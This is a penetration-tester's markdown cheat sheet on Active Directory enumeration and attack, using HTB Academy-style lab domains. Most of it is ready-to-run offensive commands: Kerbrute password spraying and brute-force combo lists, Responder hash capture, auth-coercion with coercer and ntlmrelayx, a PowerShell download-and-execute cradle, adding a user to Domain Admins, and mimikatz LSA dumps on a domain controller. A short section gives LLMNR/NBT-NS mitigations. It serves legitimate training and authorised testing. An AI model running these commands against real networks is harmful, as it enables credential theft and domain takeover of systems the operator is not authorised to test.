# 06 — Active Directory Enumeration

**Jump to:** [Tools of the Trade](#tools-of-the-trade) · [External Recon (before any internal access)](#external-recon-before-any-internal-access) · [Internal Discovery (once you have a pivot)](#internal-discovery-once-you-have-a-pivot) · [Quick Wins (before you have creds)](#quick-wins-before-you-have-creds) · [RPC Endpoint Mapping & Auth-Coercion Surface](#rpc-endpoint-mapping--auth-coercion-surface) · [Getting That First User (Kerbrute)](#getting-that-first-user-kerbrute) · [First Creds → Loot Everything They Touch](#first-creds--loot-everything-they-touch) · [LDAP](#ldap) · [LLMNR / NBT-NS Poisoning](#llmnr--nbt-ns-poisoning) · [BloodHound](#bloodhound) · [From Inside a Windows Host — ActiveDirectory Module](#from-inside-a-windows-host--activedirectory-module) · [PowerView (the heavyweight)](#powerview-the-heavyweight) · [Snaffler — Find Creds in Shares](#snaffler--find-creds-in-shares) · [Windows Host With No Tooling — Built-in Enumeration](#windows-host-with-no-tooling--built-in-enumeration) · [Sample Attack Path (end-to-end playbook)](#sample-attack-path-end-to-end-playbook) · [See Also](#see-also)

Once you can see a Domain Controller, the goal is to map users, groups, computers, ACLs, and trust relationships before authenticating with anything. Most AD attack paths fall directly out of solid enumeration.

---

### Tools of the Trade

| Tool | What it's for |
|------|---------------|
| **PowerView / SharpView** | PowerShell + .NET situational awareness — replacement for Windows `net*` commands. Good for "what else does this credential get me" sweeps. |
| **BloodHound** | Visual map of AD relationships and attack paths. Neo4j-backed; ingests SharpHound / BloodHound.py output. |
| **SharpHound** | C# collector for BloodHound — pulls users, groups, computers, ACLs, GPOs, sessions. Outputs JSON. |
| **BloodHound.py** | Python ingestor — runs from a non-domain-joined Kali. |
| **Kerbrute** | Go tool — uses Kerberos pre-auth to enum users, spray passwords, brute-force. |
| **Impacket** | Python toolkit — most of the AD attack scripts you'll use (`secretsdump`, `GetNPUsers`, `GetUserSPNs`, `ntlmrelayx`, etc.). |
| **Responder** | Poisons LLMNR / NBT-NS / mDNS — captures NetNTLM hashes on the wire. |
| **Inveigh / InveighZero** | Responder for Windows (PowerShell / C#). |
| **rpcclient** | Samba RPC client — null-session enumeration, user lookups. |
| **rpcinfo** | RPC service map on a target. |
| **netexec (CME)** | Multi-protocol auth + enum + exploitation (SMB / WinRM / LDAP / MSSQL / SSH). |
| **Rubeus** | C# Kerberos abuse — Kerberoast, AS-REP roast, PtT, S4U, dump tickets. |
| **GetUserSPNs.py** | Impacket — Kerberoast all SPN-bearing accounts. |
| **GetNPUsers.py** | Impacket — AS-REP roast pre-auth-disabled accounts. |
| **enum4linux / enum4linux-ng** | Windows / Samba enumeration helper. |
| **ldapsearch / windapsearch** | LDAP querying — windapsearch automates common AD queries. |
| **DomainPasswordSpray.ps1** | PowerShell password spray from a domain-joined Windows host. |
| **LAPSToolkit** | Audit / abuse Microsoft LAPS deployments. |
| **smbmap / smbclient** | Share enumeration / interaction. |
| **psexec.py / wmiexec.py / smbexec.py / mssqlclient.py** | Impacket execution variants. |
| **Snaffler** | File-share crawler — finds creds in configs, scripts, etc. |
| **smbserver.py** | Impacket SMB server — easy file transfers in / out of Windows. |
| **setspn.exe** | Read/modify SPN directory property on AD service accounts. |
| **Mimikatz** | Cred dump, PtH, ticket extraction. |
| **secretsdump.py** | Impacket — remote SAM / LSA / NTDS dump. |
| **evil-winrm** | WinRM shell with hash / cert / Kerberos auth. |
| **noPac.py** | CVE-2021-42278 + 42287 — standard user → DA impersonation. |
| **rpcdump.py** | RPC endpoint mapper. |
| **CVE-2021-1675.py** | PrintNightmare PoC. |
| **ntlmrelayx.py** | SMB / LDAP / HTTP relay. |
| **PetitPotam.py** | CVE-2021-36942 — EFSRPC auth coercion. |
| **gettgtpkinit.py / getnthash.py** | PKINIT TGT request + U2U PAC NT-hash extraction. |
| **adidnsdump** | Dump AD-integrated DNS records (like a zone transfer). |
| **gpp-decrypt** | Recover cleartext from cached Group Policy Preferences passwords. |
| **lookupsid.py** | SID brute force. |
| **ticketer.py** | Forge / customize TGT / TGS (golden, child→parent). |
| **raiseChild.py** | Impacket — automated child → parent escalation. |
| **AD Explorer** | GUI AD viewer / editor — snapshot for offline analysis. |
| **PingCastle** | AD risk-assessment audit. |
| **Group3r** | GPO misconfiguration audit. |
| **ADRecon** | AD environment data extract → Excel summary. |

#### Adding a binary to PATH

```bash
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O <name>
chmod +x <name>
sudo mv <name> /usr/local/bin/
```

### External Recon (before any internal access)

What you're looking for vs. where to find it:

| Data point | Looking for | Sources |
|------------|-------------|---------|
| **IP space** | ASN, public netblocks, cloud presence, DNS records | IANA, ARIN, RIPE, BGP Toolkit |
| **Domain info** | Registrar, subdomains, mail/DNS/VPN portals, defenses | DomainTools, ICANN, manual DNS against 8.8.8.8 |
| **Schema format** | Email patterns, AD usernames, password policy | LinkedIn, Twitter, About Us / Contact pages, embedded doc metadata |
| **Data disclosures** | Internal-site references, share names, hardware/software details | GitHub, S3 buckets, Azure Blob, Google dorks |
| **Breach data** | Cleartext passwords / hashes for spray reuse | HaveIBeenPwned, Dehashed |

Useful Google dorks once you know the domain:

```bash
filetype:pdf inurl:inlanefreight.com
intext:"@inlanefreight.com" inurl:inlanefreight.com
```

LinkedIn → usernames:

```bash
linkedin2username.py -c COMPANY [-n DOMAIN] [-d DEPTH] [-s SLEEP] [-x PROXY] [-k KEYWORDS] [-g] [-o OUTPUT]
```

Dehashed for cleartext from breaches:

```bash
python3 dehashed.py -q inlanefreight.local -p
```

### Internal Discovery (once you have a pivot)

```bash
## Capture ARP on the pivot to spot live hosts
wireshark                                # filter: arp

## Subnet sweep
fping -asgq 172.16.5.0/23

## Enumerate the hosts you found
nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
```

### Quick Wins (before you have creds)

```bash
## Null-session SMB
nxc smb <dc-ip> -u '' -p ''
nxc smb <dc-ip> -u '' -p '' --pass-pol             # password policy
nxc smb <dc-ip> -u '' -p '' --rid-brute            # users via RID brute

## RPC null session
rpcclient -U "" -N <dc-ip>
> enumdomusers
> getdompwinfo
```

Generate `users.txt`:

```bash
nxc smb <dc-ip> -u <user> -p <pass> --rid-brute \
  | grep 'SidTypeUser' | cut -d '\' -f2 | cut -d '(' -f1 > users.txt

## Or via rpcclient
rpcclient -U "" -N <dc-ip> -c "enumdomusers" \
  | awk -F'[][]' '{print $2}' | cut -d' ' -f1 > users.txt
```

If `enumdomusers` is restricted, brute-force RIDs manually:

```bash
for i in $(seq 500 2000); do
  echo "queryuser $i" | rpcclient -U "" -N <dc-ip> 2>/dev/null | grep -i "User Name"
done
```

#### Anonymous LDAP bind

```bash
ldapsearch -h <dc-ip> -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" \
  | grep sAMAccountName: | cut -f2 -d" "
```

#### enum4linux from SMB null session

```bash
enum4linux -U <dc-ip> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

> **SMB anonymous restricted ≠ SMB guest restricted.** If null-session SMB comes back empty, try guest before giving up: `nxc smb <ip> -u 'guest' -p ''` and `smbclient -L //<ip>/ -U 'guest%'`. Guest is a separate authenticator and admins often forget to disable it.

### RPC Endpoint Mapping & Auth-Coercion Surface

Map the RPC endpoints on a target to spot auth-coercion primitives — the interfaces that let you force a machine account to authenticate to a host you control, then relay it (`ntlmrelayx`) to LDAP, SMB, or AD CS.

```bash
impacket-rpcdump <ip>
```

Match the interface UUIDs in the output against the known coercion vectors:

| Interface | UUID (prefix) | Coercion technique |
|-----------|---------------|--------------------|
| **MS-RPRN** (Print System Remote) | `12345678-1234-abcd-ef00-0123456789ab` | **PrinterBug** — coerce via `SpoolSample` / `printerbug.py` |
| **MS-EFSR** (Encrypting File System Remote) | `c681d488-...` / `df1941c5-...` | **PetitPotam** |
| **MS-DFSNM** (DFS Namespace Mgmt) | `4fc742e0-4a10-11cf-8273-00aa004ae673` | **DFSCoerce** |
| **MS-FSRVP** (File Server VSS) | `a8e0653c-2744-4389-a61d-7373df8b2292` | **ShadowCoerce** |
| **MS-TSCH / ATSVC / MS-EVEN** | — | Occasional coercion vectors — `coercer` tests these too |

Let `coercer` probe all of them at once instead of checking UUIDs by hand:

```bash
coercer coerce -l <listener-ip> -t <target-ip> -u <user> -p <pass> -d <domain>
```

Any hit → stand up `ntlmrelayx` and relay the coerced machine-account auth. See [AD Initial Access](../3-exploitation/05-ad-initial-access.md) for the relay side.

### Getting That First User (Kerbrute)

Stealthier than SMB / LDAP probing — uses Kerberos pre-auth packets.

Wordlists worth trying first:

- All of SecLists
- <https://github.com/insidetrust/statistically-likely-usernames>
- Output of `linkedin2username.py`

```bash
## Basic enum
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt

## Build a clean valid-user list
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 /opt/jsmith.txt 2>&1 \
  | sed 's/\x1b\[[0-9;]*m//g' \
  | grep "VALID USERNAME" \
  | awk '{print $NF}' | cut -d '@' -f1 \
  | sort -u > valid_ad_users.txt

## Password spray
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```

> If clock skew breaks Kerberos: `sudo ntpdate <dc-ip>` or `sudo date -s "<time>"`.

> **Sanitize the userlist before feeding it to kerbrute.** A trailing space or stray whitespace after a name makes `userenum` silently fail to validate that user. Strip it first: `sed -i 's/[[:space:]]*$//' users.txt` (or `awk '{$1=$1};1'`). The same bites `nxc` on any list you pass it.

### First Creds → Loot Everything They Touch

The moment a set of creds authenticates, run this loop before anything fancy. Half the boxes are already over by the end of it.

#### Re-spray with the new creds

```bash
nxc smb   <range> -u '<user>' -p '<pass>' --continue-on-success
nxc winrm <range> -u '<user>' -p '<pass>' --continue-on-success
nxc mssql <range> -u '<user>' -p '<pass>' --continue-on-success
```

Any `[+]` result on a host you weren't already on = free pivot.

Then re-run full SMB enumeration with *every* new credential — a set that was low-value on one host is often admin on another, and each cred can unlock users/shares the last one couldn't see:

```bash
nxc smb <range> -u '<user>' -p '<pass>' --users --shares --groups --pass-pol --loggedon-users
```

#### List and read every share

```bash
## What's readable?
smbmap -H <ip> -u '<user>' -p '<pass>'
nxc smb <ip> -u '<user>' -p '<pass>' --shares

## Interactive
smbclient //<ip>/<share> -U '<user>%<pass>'

## Mount it so you can grep + tab-complete like a normal filesystem
mkdir -p loot/<share>
sudo mount -t cifs //<ip>/<share> ./loot/<share> \
    -o username='<user>',password='<pass>',vers=3.0
```

#### Auto-download everything with spider_plus

```bash
nxc smb <ip> -u '<user>' -p '<pass>' -M spider_plus -o DOWNLOAD_FLAG=true

## Results:
##   JSON index: /root/.nxc/modules/nxc_spider_plus/<ip>.json
##   Files:      /root/.nxc/modules/nxc_spider_plus/<ip>/
```

#### File-format gotchas when hunting configs

- **XLSX / DOCX / PPTX are ZIP files.** If a spreadsheet won't open cleanly (protected, corrupt, missing app) — `unzip file.xlsx -d out/`, then `grep -r 'password\|user\|First Name' out/`. Strings hide in `xl/sharedStrings.xml`.
- **`.INI`, `.config`, `.xml`, `web.config`, `sql-Configuration.INI`** — always cat these when you see them.
- **PDFs** — `pdftotext -layout` before grepping.

#### Re-query LDAP with the new creds (huge upgrade over anon bind)

```bash
ldapsearch -x -H ldap://<dc-ip> -D '<user>@<domain>' -w '<pass>' \
    -b 'dc=<dom>,dc=<tld>'

## Just users
ldapsearch -x -H ldap://<dc-ip> -D '<user>@<domain>' -w '<pass>' \
    -b 'dc=<dom>,dc=<tld>' '(objectClass=user)'

## PULL EVERY ATTRIBUTE — the default view hides the interesting fields
ldapsearch -x -H ldap://<dc-ip> -D '<user>@<domain>' -w '<pass>' \
    -b 'dc=<dom>,dc=<tld>' '(objectClass=user)' '*'
```

Attributes worth grepping for by name — the default output skips most of these:

| Attribute | Why |
|-----------|-----|
| `description`, `info`, `comment`, `notes` | Cleartext passwords, onboarding notes, temp creds |
| `userPassword`, `unixUserPassword`, `unicodePwd` | Occasionally actually populated |
| `ms-Mcs-AdmPwd` | **LAPS** local admin password — visible if your bind account has the ACL |
| `msDS-ManagedPassword` | **gMSA** password blob — readable only by principals in `PrincipalsAllowedToRetrieveManagedPassword` |
| `msDS-KeyCredentialLink` | Shadow credentials attack surface |
| Custom / non-standard (e.g. `cascadeLegacyPwd`, `legacyPwd`, `helpdeskPwd`) | Anything not stock AD is a red flag — the admins put it there for a reason |

Quick sweep across a full dump:

```bash
ldapsearch ... '(objectClass=user)' '*' > ldap.dump
grep -iE '^(description|info|comment|notes|userPassword|.*Pwd|ms-Mcs-AdmPwd|msDS-ManagedPassword):' ldap.dump
```

> The `info` / `description` / `comment` / `userPassword` attributes on user objects sometimes contain literal passwords the sysadmin dropped in years ago. Always grep the full user dump for `pass`, `pwd`, `secret`, `cred`.

##### Check group membership over LDAP (no shell needed)

You don't need a session to see what groups a user belongs to — if you can bind to LDAP, `nxc` will resolve it for you:

```bash
nxc ldap <dc-ip> -u <user> -p '<pass>' -M groupmembership -o USER=<user>
```

Fast way to spot that a freshly-cracked account sits in something interesting (`Remote Management Users`, `Backup Operators`, `DnsAdmins`, a custom admin group) before you spend time earning a shell.

#### AD Recycle Bin — Query Deleted Objects

When AD Recycle Bin is enabled (Windows Server 2008 R2+), deleted objects are *tombstoned* for 180 days by default — their attributes are still queryable if you can hit the `Deleted Objects` container. Membership in **`AD Recycle Bin`** (or having the `Read Deleted Objects` extended right) is enough.

**Why this matters:** old privileged accounts, decommissioned service accounts, and "TempAdmin"-style accounts often have their password stashed in `description` or `info` — and nobody rotates them because "the account is deleted." From an authenticated shell as a member of `AD Recycle Bin`:

```powershell
## Every deleted object
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects

## Deleted users only, with all attributes
Get-ADObject -Filter '(isDeleted -eq $true) -and (ObjectClass -eq "user")' \
    -IncludeDeletedObjects -Properties *

## Hunt for anything admin-adjacent
Get-ADObject -Filter 'Name -like "*TempAdmin*"' -IncludeDeletedObjects -Properties *
Get-ADObject -Filter 'Name -like "*svc*"'      -IncludeDeletedObjects -Properties *
```

From Linux with creds, the same idea via LDAP — the deleted objects live in `CN=Deleted Objects,DC=...` with a required control flag:

```bash
ldapsearch -x -H ldap://<dc-ip> -D '<user>@<domain>' -w '<pass>' \
    -b 'CN=Deleted Objects,DC=<dom>,DC=<tld>' \
    -E '!1.2.840.113556.1.4.417' '(objectClass=user)' '*'
```

Grep the output for `description`, `info`, `cascadeLegacyPwd`, or any custom attribute — that's where the old creds live.

### LDAP

```bash
## Anonymous bind test
ldapsearch -x -H ldap://<dc-ip> -s base

## Query objects (naming context must match)
ldapsearch -x -H ldap://<dc-ip> -b "dc=tryhackme,dc=loc" "(objectClass=person)"

## Domain-joined computers via netexec
nxc ldap <dc-ip> -d <domain> -u <user> -p <pass> --computers

## Just the computer names
nxc ldap <dc-ip> -d <domain> -u <user> -p <pass> --computers \
  | grep '\$' | grep -vE '\[\*\]|\[\+\]|\[-\]'

## Resolve a computer to its IP
dig +short <machine>.<domain> @<dc-ip>
```

#### windapsearch — common queries one command at a time

```bash
## Privileged users
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU

## Domain Admins
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```

#### Direct LDAP query through netexec

```bash
nxc ldap 10.129.31.188 -u 'user' -p 'pass' \
    --query "(displayName=Betty Ross)" "sAMAccountName memberOf"
```

#### Count members of a group via CME

```bash
sudo crackmapexec smb 172.16.5.5 -u dbranch -p Winter2022 --groups | grep "Interns"
```

### LLMNR / NBT-NS Poisoning

#### Responder (Linux pivot)

Runs at layer 2 — **must** be on the pivot host directly, not tunneled through Ligolo/Chisel. Needs root.

```bash
sudo responder -I <int-connected-to-internal>
```

Hashes stored at `/usr/share/responder/logs/` (or `./logs/` for git installs).

Crack the NetNTLMv2:

```bash
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
```

#### Inveigh (Windows pivot, elevated shell)

Check the .NET version, then pull the matching binary:

```bash
reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full" /v Release
.\Inveigh.exe
```

Inside Inveigh:

```bash
GET NTLMV2UNIQUE             # show unique captures
GET NTLMV2USERNAMES          # show captured usernames
```

#### Mitigation (defender view)

Disable LLMNR and NBT-NS:

- **LLMNR** — Computer Configuration → Administrative Templates → Network → DNS Client → enable "Turn OFF Multicast Name Resolution"
- **NBT-NS** — push a startup script via GPO:

```powershell
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey | foreach {
    Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose
}
```

Host the script on `SYSVOL`, link via a GPO to all hosts, then restart.

### BloodHound

#### Remote collection from Kali

```bash
bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```

> **Always collect with `-c All`.** The default collection method skips ACL data, so you'll miss `GenericAll` / `WriteDACL` / `ForceChangePassword` edges — which are usually the entire path to DA. Use `-c All`, or `-c DCOnly` when you need to stay quiet.

#### SharpHound on a domain host

```powershell
Invoke-Bloodhound -CollectionMethod All -Domain <DOM>.local -ZipFileName loot.zip
```

Pull the zip back to Kali:

```bash
scp Administrator@<victim>:/C:<loot-path> .
```

#### Visualize

```bash
sudo apt install bloodhound
bloodhound-start                       # convenience wrapper
neo4j console &                        # or systemctl start neo4j
bloodhound                             # login neo4j:neo4j
```

Pre-built queries worth running first:

- *Shortest paths to Domain Admins*
- *Users with DCSync*
- *Kerberoastable users*
- *AS-REP Roastable users*
- *Computers where this user has admin rights*
- *Find Computers where Domain Users are Local Admin*

#### Cypher queries worth keeping

```bash
## Users who can PSRemote
MATCH p=(u:User)-[:CanPSRemote]->(c:Computer) RETURN p

## AS-REP roastable accounts
MATCH (u:User {dontreqpreauth: true}) RETURN u.name
```

### From Inside a Windows Host — ActiveDirectory Module

```powershell
Import-Module ActiveDirectory

Get-ADDomain
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName   # Kerberoastable
Get-ADTrust -Filter *
Get-ADGroup -Filter * | select name
Get-ADGroup -Identity "Backup Operators"
Get-ADGroupMember -Identity "Backup Operators"
```

### PowerView (the heavyweight)

```powershell
Import-Module .\PowerView.ps1
```

| Cmd-Let | Purpose |
|---------|---------|
| `Export-PowerViewCSV` | Append results to CSV |
| `ConvertTo-SID` | User/group name → SID |
| `Get-DomainSPNTicket` | Request TGS for a given SPN |
| `Get-Domain` | Current (or specified) domain object |
| `Get-DomainController` | DCs in the domain |
| `Get-DomainUser` | Users (filterable) |
| `Get-DomainComputer` | Computers |
| `Get-DomainGroup` | Groups |
| `Get-DomainOU` | OUs |
| `Find-InterestingDomainAcl` | ACLs with modify rights set to non-built-ins |
| `Get-DomainGroupMember` | Members of a specific group |
| `Get-DomainFileServer` | Hosts likely acting as file servers |
| `Get-DomainDFSShare` | DFS shares in the domain |
| `Get-DomainGPO` | GPOs |
| `Get-DomainPolicy` | Default domain / DC policy |
| `Get-NetLocalGroup` | Local groups (local or remote) |
| `Get-NetLocalGroupMember` | Members of a specific local group |
| `Get-NetShare` | Open shares |
| `Get-NetSession` | Logon sessions on a host |
| `Test-AdminAccess` | Do *you* have local admin on this host? |
| `Find-DomainUserLocation` | Where a specific user is currently logged in |
| `Find-DomainShare` | Reachable shares across the domain |
| `Find-InterestingDomainShareFile` | File-content search across readable shares |
| `Find-LocalAdminAccess` | Hosts where the *current user* has local admin |
| `Get-DomainTrust` / `Get-ForestTrust` | Domain / forest trusts |
| `Get-DomainForeignUser` | Users in groups outside their own domain |
| `Get-DomainForeignGroupMember` | Groups containing users from other domains |
| `Get-DomainTrustMapping` | Enumerate all trusts reachable from here |

Notable one-liners:

```powershell
## Full user object dump
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local |
    Select-Object -Property name,samaccountname,description,memberof,whencreated,
        pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,
        serviceprincipalname,useraccountcontrol

## Recursive group expansion
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

## Trust map
Get-DomainTrustMapping

## Local admin test
Test-AdminAccess -ComputerName ACADEMY-EA-MS01

## Kerberoastable accounts + grab a ticket
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat
```

### Snaffler — Find Creds in Shares

```powershell
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

Run it once, then grep the log for config strings and connection strings later:

```powershell
Select-String -Path .\snaffler.log -Pattern "connectionstring|data source|initial catalog|password=" -CaseSensitive:$false
```

### Windows Host With No Tooling — Built-in Enumeration

#### Basic commands

| Command | Result |
|---------|--------|
| `hostname` | PC name |
| `[System.Environment]::OSVersion.Version` | OS version |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Installed hotfixes |
| `ipconfig /all` | Network adapter config |
| `set` | Env vars (cmd.exe) |
| `echo %USERDOMAIN%` | Domain name |
| `echo %logonserver%` | Logon DC |

#### PowerShell helpers

| Cmd-Let | Purpose |
|---------|---------|
| `Get-Module` | Loaded modules |
| `Get-ExecutionPolicy -List` | Execution policy per scope |
| `Set-ExecutionPolicy Bypass -Scope Process` | Temporarily bypass — reverts when the process exits |
| `Get-ChildItem Env: \| ft Key,Value` | Env values |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | User's PowerShell history (creds, configs) |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL');<cmd>"` | Download + execute in memory |
| `powershell.exe -version 2` | Downgrade — can break some blue-team logging |

#### Networking

| Command | Result |
|---------|--------|
| `arp -a` | ARP table |
| `ipconfig /all` | Adapter settings |
| `route print` | IPv4/IPv6 routing table |
| `netsh advfirewall show allprofiles` | Firewall status |

#### WMI

| Command | Result |
|---------|--------|
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Hotfixes |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Host basics |
| `wmic process list /format:list` | Process list |
| `wmic ntdomain list /format:list` | Domain + DCs |
| `wmic useraccount list /format:list` | Local + cached domain users |
| `wmic group list /format:list` | Local groups |
| `wmic sysaccount list /format:list` | Service accounts |

#### net

| Command | Result |
|---------|--------|
| `net accounts` | Password policy (local) |
| `net accounts /domain` | Password + lockout policy (domain) |
| `net group /domain` | Domain groups |
| `net group "Domain Admins" /domain` | DA members |
| `net group "Domain Controllers" /domain` | DCs |
| `net group "domain computers" /domain` | Domain-joined computers |
| `net localgroup` | Local groups |
| `net localgroup administrators /domain` | Local admins (incl. DA by default) |
| `net localgroup administrators [user] /add` | Add user to local admins |
| `net share` | Current shares |
| `net user <ACCOUNT> /domain` | User info |
| `net user /domain` | All domain users |
| `net user %username%` | Current user |
| `net use x: \\<computer>\<share>` | Mount a share |
| `net view` | Reachable computers |
| `net view /all /domain[:dom]` | Shares across the domain |
| `net view \\<computer> /ALL` | Shares on one host |

#### dsquery (elevated)

```bash
dsquery user
dsquery computer

## Disabled accounts (UAC flag 32)
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" \
    -attr distinguishedName userAccountControl
```

### Sample Attack Path (end-to-end playbook)

1. Gain access to an external / internal pivot host.
2. Set up Ligolo-ng on the pivot.
3. `nmap` all internal subnets through the tunnel.
4. `enum4linux-ng` everything that responds.
5. Kerbrute the DC with likely usernames.
6. Once you have one valid set of creds:
   - Pull every user via CME and clean the list:
     ```bash
     crackmapexec smb 172.16.7.3 -u 'ab920' -p 'weasal' --users | tee usernames.txt
     cat usernames.txt | cut -d'\' -f2 | awk -F " " '{print $1}' | tee cleanusers.txt
     ```
   - Build a `user:pass` combo file and brute via kerbrute:
     ```bash
     awk 'NR==FNR{p[++np]=$0; next}{for(i=1;i<=np;i++) print $0 ":" p[i]}' \
         2023-200_most_used_passwords.txt cleanusers.txt > combos.txt
     cat combos.txt | kerbrute bruteforce -d inlanefreight.local --dc 172.16.7.3 -
     ```
7. Run Snaffler against reachable shares for cached connection strings / passwords.
8. Either pivot with the new creds or escalate locally on the pivot.
9. Once you have sudo / SYSTEM, run Responder / Inveigh for further hashes.
10. Where BloodHound shows a `GenericWrite` edge → add yourself to a high-priv group:
    ```bash
    net group 'Domain Admins' ct059 /add /domain
    ```
    Enter a higher-priv session:
    ```powershell
    $cred = New-Object System.Management.Automation.PSCredential(
        "INLANEFREIGHT\CT059",
        (ConvertTo-SecureString "charlie1" -AsPlainText -Force))
    Enter-PSSession -ComputerName DC01 -Credential $cred
    ```
11. DCs often have RDP disabled. To run mimikatz on the DC, use PSRemoting or PsExec:
    ```powershell
    ## via WinRM
    Enter-PSSession -ComputerName DC01
    cd C:\Windows\Temp
    .\mimikatz.exe "privilege::debug" "lsadump::lsa /inject" "exit"

    ## via PsExec from MS01
    .\PsExec.exe \\DC01 -accepteula C:\Windows\Temp\mimikatz.exe `
        "privilege::debug" "lsadump::lsa /inject" "exit"
    ```

### See Also

- [AD Initial Access](../3-exploitation/05-ad-initial-access.md) — ASREPRoasting, Kerberoasting, password spray, pass-the-hash.
- [Kerberos Attacks](../5-lateral-movement/03-kerberos-attacks.md) — constrained delegation, golden ticket, child→parent (ExtraSids).
- [ACL Abuse with bloodyAD](../5-lateral-movement/04-acl-abuse-bloodyad.md) — once BloodHound shows you ACL paths.
- [Credential Dumping](../4-post-exploitation/03-credential-dumping.md) — Mimikatz, secretsdump, NTDS.dit.
